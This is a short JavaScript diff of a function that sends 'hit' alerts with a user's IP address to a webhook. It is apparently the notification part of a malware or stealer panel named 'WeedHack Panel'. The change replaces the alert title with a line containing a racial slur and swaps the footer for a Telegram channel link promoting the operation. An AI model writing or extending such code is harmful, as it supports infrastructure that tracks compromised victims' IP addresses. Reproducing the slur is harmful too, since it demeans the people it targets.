@@ -8,12 +8,12 @@ export async function sendHitWebhook(userId, hitName, ipAddress) {
     username: 'Allen wood',
     embeds: [
       {
-        title: 'Nice hit ',
+        title: 'Cam down ni**er you got the hit ',
         color: 0x00FF00, // Green
         fields: [
           { name: 'IP Address', value: `\`${ipAddress}\``, inline: false }
         ],
-        footer: { text: 'WeedHack Panel' },
+        footer: { text: 'join t.me/WeedhookReborn' },
         timestamp: new Date().toISOString()
       }
     ]
